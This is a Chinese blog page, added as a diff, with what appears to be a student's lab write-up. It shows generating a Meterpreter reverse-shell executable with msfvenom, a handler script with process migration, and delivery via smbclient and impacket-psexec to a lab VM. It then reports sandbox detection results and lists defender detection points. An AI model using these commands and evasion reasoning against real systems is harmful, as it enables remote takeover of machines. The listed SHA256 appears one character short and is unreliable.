@@ -1,0 +1,995 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="AsukaYi">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="课程作业要求复现”对被控端控制”，并把生成的被控端样本提交微步云沙箱检测。全程在本地 VMware 隔离网络里完成，靶机是我自己的虚拟机。   0. 环境   角色 系统 IP    攻击端 Kali Linux 2026.2 10.0.0.5   被控端 Windows Server 2003 SP1（Host1B） 10.0.0.6   两台都挂在 VMware 的 NAT 虚拟网段，10.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ch6：远程控制">
+<meta property="og:url" content="https://asukayil.github.io/2026/11/22/ch6%EF%BC%9A%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6/index.html">
+<meta property="og:site_name" content="AsukaYi的博客">
+<meta property="og:description" content="课程作业要求复现”对被控端控制”，并把生成的被控端样本提交微步云沙箱检测。全程在本地 VMware 隔离网络里完成，靶机是我自己的虚拟机。   0. 环境   角色 系统 IP    攻击端 Kali Linux 2026.2 10.0.0.5   被控端 Windows Server 2003 SP1（Host1B） 10.0.0.6   两台都挂在 VMware 的 NAT 虚拟网段，10.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://asukayil.github.io/images/01-msfvenom-generate.png">
+<meta property="og:image" content="https://asukayil.github.io/images/02-handler-started.png">
+<meta property="og:image" content="https://asukayil.github.io/images/03-shell-getuid-ipconfig.png">
+<meta property="og:image" content="https://asukayil.github.io/images/04-sessions-list.png">
+<meta property="og:image" content="https://asukayil.github.io/images/05-threatbook-overview.png">
+<meta property="og:image" content="https://asukayil.github.io/images/06-threatbook-engines.png">
+<meta property="article:published_time" content="2026-11-22T09:38:21.000Z">
+<meta property="article:modified_time" content="2026-11-22T10:05:48.953Z">
+<meta property="article:author" content="AsukaYi">
+<meta property="article:tag" content="沙箱检测">
+<meta property="article:tag" content="远程控制">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://asukayil.github.io/images/01-msfvenom-generate.png">
+  
+  
+  
+  <title>ch6：远程控制 - AsukaYi的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"asukayil.github.io","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>AsukaYi的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>归档</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>分类</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>关于</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>搜索</span>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
+               data-label-light="开灯"
+               data-label-dark="关灯">
+            <a href="javascript:;" aria-label="Color Toggle">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
+                <span id="mobile-color-toggle-label">关灯</span>
+              </div>
+            </a>
+          </div>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="ch6：远程控制"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-11-22 17:38" pubdate>
+          2026年11月22日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.7k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          39 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">ch6：远程控制</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <blockquote>
+<p>课程作业要求复现”对被控端控制”，并把生成的被控端样本提交微步云沙箱检测。<br>全程在本地 VMware 隔离网络里完成，靶机是我自己的虚拟机。</p>
+</blockquote>
+<hr>
+<h2 id="0-环境"><a href="#0-环境" class="headerlink" title="0. 环境"></a>0. 环境</h2><table>
+<thead>
+<tr>
+<th>角色</th>
+<th>系统</th>
+<th>IP</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>攻击端</td>
+<td>Kali Linux 2026.2</td>
+<td>10.0.0.5</td>
+</tr>
+<tr>
+<td>被控端</td>
+<td>Windows Server 2003 SP1（Host1B）</td>
+<td>10.0.0.6</td>
+</tr>
+</tbody></table>
+<p>两台都挂在 VMware 的 <strong>NAT 虚拟网段</strong>，<code>10.0.0.0/24</code>。选这个网段是有意的——它是宿主内部的虚拟交换机，跑什么都出不了我这台电脑。</p>
+<p>Metasploit Framework <code>6.4.135-dev</code>。</p>
+<hr>
+<h2 id="1-生成被控端"><a href="#1-生成被控端" class="headerlink" title="1. 生成被控端"></a>1. 生成被控端</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p windows/meterpreter/reverse_tcp \<br>         LHOST=10.0.0.5 LPORT=4444 \<br>         -f exe -o backdoor.exe<br></code></pre></td></tr></table></figure>
+
+<p>输出里有几行容易忽略但很说明问题：</p>
+<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-title class_">No</span> platform was selected, choosing <span class="hljs-title class_">Msf</span>::<span class="hljs-title class_">Module</span>::<span class="hljs-title class_">Platform</span>::<span class="hljs-title class_">Windows</span> from the payload<br><span class="hljs-title class_">No</span> arch selected, selecting arch: x86 from the payload<br><span class="hljs-title class_">No</span> encoder specified, outputting raw payload<br><span class="hljs-title class_">Payload</span> size: <span class="hljs-number">355</span> bytes<br><span class="hljs-title class_">Final</span> size of exe file: <span class="hljs-number">7168</span> bytes<br></code></pre></td></tr></table></figure>
+
+<p><strong>payload 只有 355 字节，最终 exe 却有 7168 字节。</strong></p>
+<p>这就是 Metasploit 的 <strong>stager（分阶段加载器）</strong> 设计：exe 里塞的其实不是完整的 Meterpreter，只是一小段引导代码 + 一个 PE 壳。真正的大头（这次是 199238 字节的 stage）在<strong>连上攻击端之后才下载</strong>。</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">[*] Sending stage <span class="hljs-punctuation">(</span><span class="hljs-number">199238</span> bytes<span class="hljs-punctuation">)</span> to <span class="hljs-number">10.0.0.6</span><br></code></pre></td></tr></table></figure>
+
+<p>这也解释了一件事：<strong>exe 本身很干净，杀软不好抓</strong>。因为”坏”的部分根本不在文件里，是运行时才拉下来的。这是分阶段 payload 最本质的规避思路——不是免杀，是”文件里没东西可杀”。</p>
+<p><img src="/images/01-msfvenom-generate.png" alt="生成被控端"></p>
+<hr>
+<h2 id="2-起监听"><a href="#2-起监听" class="headerlink" title="2. 起监听"></a>2. 起监听</h2><p><code>handler.rc</code>：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ruby">use exploit/multi/handler<br>set <span class="hljs-variable constant_">PAYLOAD</span> windows/meterpreter/reverse_tcp<br>set <span class="hljs-variable constant_">LHOST</span> <span class="hljs-number">10.0</span>.<span class="hljs-number">0.5</span><br>set <span class="hljs-variable constant_">LPORT</span> <span class="hljs-number">4444</span><br>set <span class="hljs-title class_">ExitOnSession</span> <span class="hljs-literal">false</span><br>set <span class="hljs-title class_">AutoRunScript</span> post/windows/manage/migrate<br>exploit -j -z<br></code></pre></td></tr></table></figure>
+
+<p>两个参数值得说：</p>
+<ul>
+<li><strong><code>ExitOnSession false</code></strong> —— 拿到一个会话后监听不退出，方便反复测试。做实验时如果不写这句，第一个会话断开后 handler 就没了。</li>
+<li><strong><code>AutoRunScript .../migrate</code></strong> —— 上线后自动做<strong>进程迁移</strong>。原理是把 Meterpreter 的反射 DLL 注入到另一个正常进程（这次是 <code>notepad.exe</code>），然后结束原来那个 <code>backdoor.exe</code>。好处是：受害者关了 backdoor.exe 或者杀软干掉了它，会话依然在。</li>
+</ul>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-string">[*]</span> Current server process: backdoor.exe (<span class="hljs-number">1848</span>)<br><span class="hljs-string">[*]</span> Spawning notepad.exe process to migrate <span class="hljs-built_in">int</span>o<br><span class="hljs-string">[*]</span> Spoofing PPID <span class="hljs-number">0</span><br><span class="hljs-string">[*]</span> Migrating <span class="hljs-built_in">int</span>o <span class="hljs-number">640</span><br><span class="hljs-string">[*]</span> Meterpreter session <span class="hljs-number">1</span> opened (<span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.5</span>:<span class="hljs-number">4444</span> -&gt; <span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.6</span>:<span class="hljs-number">1032</span>)<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/02-handler-started.png" alt="监听启动"></p>
+<hr>
+<h2 id="3-上线，拿到-SYSTEM"><a href="#3-上线，拿到-SYSTEM" class="headerlink" title="3. 上线，拿到 SYSTEM"></a>3. 上线，拿到 SYSTEM</h2><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs dart">meterpreter &gt; sysinfo<br>OS           : <span class="hljs-title class_">Windows</span> <span class="hljs-title class_">Server</span> <span class="hljs-number">2003</span> (<span class="hljs-number">5.2</span> <span class="hljs-title class_">Build</span> <span class="hljs-number">3790</span>, <span class="hljs-title class_">Service</span> <span class="hljs-title class_">Pack</span> <span class="hljs-number">1</span>)<br><span class="hljs-title class_">Architecture</span> : x86<br><span class="hljs-title class_">Computer</span>     : <span class="hljs-title class_">Host1B</span><br><span class="hljs-title class_">Meterpreter</span>  : x86/windows<br><br>meterpreter &gt; getuid<br><span class="hljs-title class_">Server</span> username: NT AUTHORITY\SYSTEM<br><br>meterpreter &gt; ipconfig<br><span class="hljs-title class_">Interface</span> <span class="hljs-number">65539</span><br>============<br><span class="hljs-title class_">Name</span>         : <span class="hljs-title class_">VMware</span> <span class="hljs-title class_">Accelerated</span> AMD <span class="hljs-title class_">PCNet</span> <span class="hljs-title class_">Adapter</span><br><span class="hljs-title class_">IPv4</span> <span class="hljs-title class_">Address</span> : <span class="hljs-number">10.0</span>.<span class="hljs-number">0.6</span><br></code></pre></td></tr></table></figure>
+
+<p><strong><code>NT AUTHORITY\SYSTEM</code> —— 直接是系统最高权限，不是普通用户。</strong></p>
+<p>这点其实值得留意：样本是被当作服务启动的（用 psexec 投递时），而 Windows 服务默认就跑在 SYSTEM 下。同样是执行一个 exe，<strong>“用户双击”和”服务启动”拿到的权限完全不是一个量级</strong>。真实攻击里如果拿到管理员凭据，攻击者更喜欢用服务&#x2F;计划任务这类方式落 payload，就是为了这一步到位。</p>
+<p><img src="/images/03-shell-getuid-ipconfig.png" alt="SYSTEM 权限"></p>
+<p>会话列表：</p>
+<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-title class_">Id</span>  <span class="hljs-title class_">Name</span>  <span class="hljs-title class_">Type</span>                 <span class="hljs-title class_">Information</span>           <span class="hljs-title class_">Connection</span><br><span class="hljs-number">1</span>         meterpreter x86/win  NT AUTHORITY\SYSTEM   <span class="hljs-number">10.0</span>.<span class="hljs-number">0.5</span>:<span class="hljs-number">4444</span><br>                               @ <span class="hljs-title class_">Host1B</span>               -&gt; <span class="hljs-number">10.0</span>.<span class="hljs-number">0.6</span>:<span class="hljs-number">1032</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/04-sessions-list.png" alt="会话列表"></p>
+<hr>
+<h2 id="4-送进微步沙箱"><a href="#4-送进微步沙箱" class="headerlink" title="4. 送进微步沙箱"></a>4. 送进微步沙箱</h2><p>把 <code>backdoor.exe</code> 上传到 <a target="_blank" rel="noopener" href="https://s.threatbook.com/">s.threatbook.com</a>，几分钟后结果：</p>
+<table>
+<thead>
+<tr>
+<th>项目</th>
+<th>结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>判定</td>
+<td><strong>恶意</strong></td>
+</tr>
+<tr>
+<td>威胁分类</td>
+<td><strong>木马</strong></td>
+</tr>
+<tr>
+<td>木马家族</td>
+<td><strong>Agent</strong></td>
+</tr>
+<tr>
+<td>引擎检出</td>
+<td><strong>11 &#x2F; 28</strong></td>
+</tr>
+</tbody></table>
+<p><img src="/images/05-threatbook-overview.png" alt="沙箱总览"></p>
+<h3 id="最有意思的是检出命名"><a href="#最有意思的是检出命名" class="headerlink" title="最有意思的是检出命名"></a>最有意思的是检出命名</h3><table>
+<thead>
+<tr>
+<th>引擎</th>
+<th>检出名称</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>微软 MSE</td>
+<td><code>Trojan:Win32/</code><strong>Meterpreter</strong><code>.RPZ!MTB</code></td>
+</tr>
+<tr>
+<td>大蜘蛛 Dr.Web</td>
+<td><code>BackDoor.</code><strong>Meterpreter</strong><code>.1462</code></td>
+</tr>
+<tr>
+<td>Avast</td>
+<td><code>Win32:</code><strong>MsfShell</strong><code>-E</code></td>
+</tr>
+<tr>
+<td>AVG</td>
+<td><code>Win32:</code><strong>MsfShell</strong><code>-E</code></td>
+</tr>
+<tr>
+<td>卡巴斯基</td>
+<td><code>HEUR:Trojan.Win32.Agent.gen</code></td>
+</tr>
+<tr>
+<td>ESET</td>
+<td><code>a variant of Win32/Rozena.BZ...</code></td>
+</tr>
+<tr>
+<td>小红伞</td>
+<td><code>TR/Crypt.XPACK.Gen</code></td>
+</tr>
+<tr>
+<td>IKARUS</td>
+<td><strong>无检出</strong></td>
+</tr>
+</tbody></table>
+<p><img src="/images/06-threatbook-engines.png" alt="引擎检出"></p>
+<p>四个引擎的病毒名里<strong>直接写着 Meterpreter &#x2F; MsfShell</strong>。也就是说，<code>msfvenom</code> 的默认输出带着公开可识别的特征签名，连我用的什么工具都认出来了——因为我一行免杀都没做。</p>
+<p>剩下的大多是 <code>Agent.gen</code> &#x2F; <code>Genetic</code> &#x2F; <code>Crypt.XPACK</code> 这种<strong>通用启发式</strong>：它们并不认识 Meterpreter，只是觉得”这东西行为可疑 &#x2F; 加了壳”。</p>
+<p>而 <strong>17 个引擎没报</strong>。这组数字挺说明问题的：单一引擎的检出率就是不可靠，同一份样本换一家扫可能就是”安全”。多引擎交叉验证不是保险，是必要。</p>
+<hr>
+<h2 id="5-一个值得单独说的问题：沙箱为什么连不上-C2"><a href="#5-一个值得单独说的问题：沙箱为什么连不上-C2" class="headerlink" title="5. 一个值得单独说的问题：沙箱为什么连不上 C2"></a>5. 一个值得单独说的问题：沙箱为什么连不上 C2</h2><p>样本的 C2 写死的是 <code>10.0.0.5:4444</code>，那是我本地 VMware 的虚拟网段。微步的沙箱跑在公网机房，<strong>永远到不了这个地址</strong>。</p>
+<p>所以它的动态分析里，网络行为只能是”尝试连接超时”。</p>
+<p>但它的判定依然是<strong>恶意 &#x2F; 木马</strong>。为什么？</p>
+<p>因为沙箱判定根本不依赖”真的把 C2 连上”。它靠的是：</p>
+<ol>
+<li>静态特征（PE 结构、shellcode 模式）</li>
+<li>行为特征（进程注入、<code>notepad.exe</code> 这种异常子进程）</li>
+<li>硬编码的固定 IP + 端口回连地址 —— <strong>这本身就是后门最强的标志</strong></li>
+</ol>
+<p>这件事让我想明白一个区别：<strong>“沙箱能复现的攻击” ≠ “沙箱能判定的事情”</strong>。一份断网就失效的木马，依然是木马。</p>
+<hr>
+<h2 id="6-踩坑记录"><a href="#6-踩坑记录" class="headerlink" title="6. 踩坑记录"></a>6. 踩坑记录</h2><p>这部分比结论更有意思。</p>
+<h3 id="坑-1：Kali-的-msfconsole-直接崩"><a href="#坑-1：Kali-的-msfconsole-直接崩" class="headerlink" title="坑 1：Kali 的 msfconsole 直接崩"></a>坑 1：Kali 的 msfconsole 直接崩</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">Too many levels of symbolic links - opendir @ <span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/llvm-21/</span>build<span class="hljs-regexp">/Release/</span>build<span class="hljs-regexp">/Release/</span>build<span class="hljs-regexp">/Release/</span>...<br></code></pre></td></tr></table></figure>
+
+<p><code>/usr/lib/llvm-21/build/</code> 里有两个指向父目录的软链接（<code>Release -&gt; ..</code>、<code>Debug+Asserts -&gt; ..</code>），Ruby 的 bootsnap 在扫描加载路径时顺着它们无限递归，直接把 msfconsole 打死。</p>
+<p>删掉这两个链接就好了（它们只是旧版 LLVM 构建树的兼容占位，不影响任何东西）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">rm</span> -f /usr/lib/llvm-21/build/Release /usr/lib/llvm-21/build/Debug+Asserts<br></code></pre></td></tr></table></figure>
+
+<h3 id="坑-2：msfconsole-必须-root"><a href="#坑-2：msfconsole-必须-root" class="headerlink" title="坑 2：msfconsole 必须 root"></a>坑 2：msfconsole 必须 root</h3><p>修完上一条，普通用户跑又报：</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">Permission denied - opendir @ <span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/ssl/</span><span class="hljs-keyword">private</span><br></code></pre></td></tr></table></figure>
+
+<p><code>/usr/lib/ssl/private</code> 是 0700 的，bootsnap 扫不进去。<code>sudo msfconsole</code> 才行。</p>
+<h3 id="坑-3：VMware-Tools-太老，投递失败"><a href="#坑-3：VMware-Tools-太老，投递失败" class="headerlink" title="坑 3：VMware Tools 太老，投递失败"></a>坑 3：VMware Tools 太老，投递失败</h3><p>本来想让被控端自己下载执行，结果 <code>vmrun</code> 所有访客操作都报：</p>
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit"><span class="hljs-keyword">Error: </span>The VMware Tools are not running in the virtual machine<br></code></pre></td></tr></table></figure>
+
+<p>而 <code>checkToolsState</code> 明明返回 <code>running</code>。这是 <strong>Win2003 里的老版 Tools 与 VMware 17 不兼容</strong>——状态能查到，VIX 接口调不通。</p>
+<p>最后改用 SMB + impacket：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">smbclient //10.0.0.6/Work -U <span class="hljs-string">&#x27;administrator%***&#x27;</span> -m SMB2 \<br>          -c <span class="hljs-string">&#x27;put backdoor.exe backdoor.exe&#x27;</span><br><br>impacket-psexec <span class="hljs-string">&#x27;administrator:***@10.0.0.6&#x27;</span> -c /home/kali/ch6/backdoor.exe<br></code></pre></td></tr></table></figure>
+
+<p><strong>注意这会导致一个语义差别</strong>：样本是被”远程执行”的，不是我手动双击的。写报告时这点必须写清楚，不能含糊。</p>
+<p>顺带说，<code>impacket-atexec</code> 在 Win2003 上直接报错 <code>This will work ONLY on Windows &gt;= Vista</code> —— 老系统上现代工具链经常有这种坑。</p>
+<h3 id="坑-4：截图截出一片黑"><a href="#坑-4：截图截出一片黑" class="headerlink" title="坑 4：截图截出一片黑"></a>坑 4：截图截出一片黑</h3><p>Kali 用 <code>nogui</code> 启动的话，<code>vmrun captureScreen</code> 出来是纯黑的（3KB PNG）。必须 <strong>GUI 模式启动</strong>才有 framebuffer。</p>
+<p>还有个细节：X 会话闲置会锁屏，锁屏后截图全是登录框。得先 <code>xset s off -dpms</code> 关掉屏保。</p>
+<hr>
+<h2 id="7-如果站在防守方"><a href="#7-如果站在防守方" class="headerlink" title="7. 如果站在防守方"></a>7. 如果站在防守方</h2><p>把攻击链倒过来看，每一环都有对应的检测点：</p>
+<table>
+<thead>
+<tr>
+<th>攻击行为</th>
+<th>防守侧能否发现</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>无签名 PE 落地</td>
+<td>应用白名单、签名校验</td>
+</tr>
+<tr>
+<td>进程注入 + <code>notepad.exe</code> 之类异常子进程</td>
+<td>EDR 的进程行为监控</td>
+</tr>
+<tr>
+<td>固定 IP:4444 长连接</td>
+<td>网络侧看非标准端口、外连白名单</td>
+</tr>
+<tr>
+<td>服务创建（psexec 投递）</td>
+<td>审计 Event ID 7045 &#x2F; 4697</td>
+</tr>
+<tr>
+<td>SYSTEM 权限</td>
+<td>最小权限原则、服务账户降权</td>
+</tr>
+</tbody></table>
+<p>还有一条最容易忽略的：<strong>出口流量管控</strong>。如果内网禁止随意外联，这类木马的回连根本建立不起来——这也解释了为什么真实企业环境里攻击者要费那么大劲做隧道和域前置。</p>
+<hr>
+<h2 id="8-小结"><a href="#8-小结" class="headerlink" title="8. 小结"></a>8. 小结</h2><p>这次最有价值的不是”拿到了 SYSTEM 会话”，而是三个认知：</p>
+<ol>
+<li><strong>分阶段 payload 让”文件”和”能力”分离</strong>。文件里只有 355 字节的引导器，真正的东西运行时才下载——所以静态查杀天生吃力。</li>
+<li><strong>进程迁移是为了活得久</strong>。把代码注入正常进程再杀掉原体，是后门对抗”用户关窗口”和”杀软清进程”的标准手法。</li>
+<li><strong>沙箱的判定能力和复现能力是两回事</strong>。连不上 C2 的木马依然是木马，因为”硬编码回连地址”这个结构本身就是证据。</li>
+</ol>
+<p>最后照例声明：以上全部在本人本地隔离的虚拟机环境中完成，未对任何真实主机或网络发起操作。</p>
+<hr>
+<p><em>样本哈希（供核对）：</em><br><code>MD5 dfd292245fd3968b7379b72234e8af49</code><br><code>SHA256 c6c0a2652139f1e7888ea17eae7d0370c846ddb5ae9c98a35372d028ca44539</code></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
